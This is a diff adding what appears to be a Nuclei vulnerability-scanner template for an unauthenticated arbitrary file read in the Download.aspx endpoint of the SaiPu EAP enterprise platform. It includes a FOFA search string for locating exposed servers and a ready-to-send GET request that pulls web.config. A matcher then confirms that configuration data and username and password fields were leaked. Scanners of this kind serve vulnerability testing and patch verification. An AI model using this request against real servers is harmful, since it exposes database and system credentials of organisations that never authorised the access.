@@ -1,0 +1,25 @@
+id: SaiPu-EAP-QiYeShiPeiGuanLiPingTai-Download_aspx-File-Reading
+
+info:
+  name: 赛普EAP企业适配管理平台 Download.aspx 任意文件读取
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: body="IDWebSoft/"
+    赛普EAP企业适配管理平台 Download.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference: |
+    -
+  tags: File Reading
+  
+http:
+  - raw:
+      - |-
+        GET /IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains_all(body,'configuration','template','appSettings','用户名','密码')"
